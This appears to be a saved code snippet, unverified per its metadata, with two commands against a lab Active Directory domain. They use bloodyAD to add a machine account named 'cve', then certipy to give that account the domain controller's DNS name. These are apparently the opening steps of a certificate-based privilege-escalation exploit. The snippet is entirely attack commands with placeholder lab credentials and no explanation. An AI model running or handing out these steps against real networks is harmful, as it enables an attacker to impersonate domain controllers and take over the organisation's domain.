---
id: faf2203f-5951-467a-9b8e-a135563ea53a
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:06.137123+00:00'
updated_at: '2023-04-10T20:36:10.277684+00:00'
---

# Code Snippet faf2203f

**Language**: ps1

```ps1
python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 addComputer cve 'CVEPassword1234*'
certipy account create 'lab.local/username:Password123*@dc.lab.local' -user 'cve' -dns 'dc.lab.local'
```
